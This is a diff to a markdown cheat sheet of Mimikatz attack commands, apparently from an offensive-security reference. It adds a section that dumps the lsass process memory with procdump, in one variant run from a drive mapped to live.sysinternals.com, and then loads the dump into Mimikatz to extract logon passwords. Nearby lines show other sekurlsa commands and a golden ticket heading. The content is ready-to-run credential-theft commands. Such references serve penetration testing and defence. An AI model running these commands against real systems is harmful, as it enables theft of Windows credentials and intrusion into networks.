@@ -26,6 +26,25 @@ mimikatz_command -f sekurlsa::logonPasswords full
 mimikatz_command -f sekurlsa::wdigest
 ```
 
+## Mimikatz - Mini Dump
+
+Dump the lsass process.
+
+```powershell
+C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+net use Z: https://live.sysinternals.com
+Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
+
+Then load it inside Mimikatz.
+
+```powershell
+mimikatz # sekurlsa::minidump lsass.dmp
+Switch to minidump
+mimikatz # sekurlsa::logonPasswords
+```
+
 ## Mimikatz Golden ticket
 
 ```powershell
